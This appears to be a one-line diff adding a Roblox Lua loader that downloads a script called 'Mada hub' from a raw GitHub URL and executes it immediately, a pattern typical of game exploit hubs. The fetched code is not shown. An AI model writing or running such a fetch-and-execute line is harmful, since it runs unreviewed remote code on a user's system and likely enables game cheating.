@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jfdedit3/Mada-hub/refs/heads/main/Mada%20hub"))()
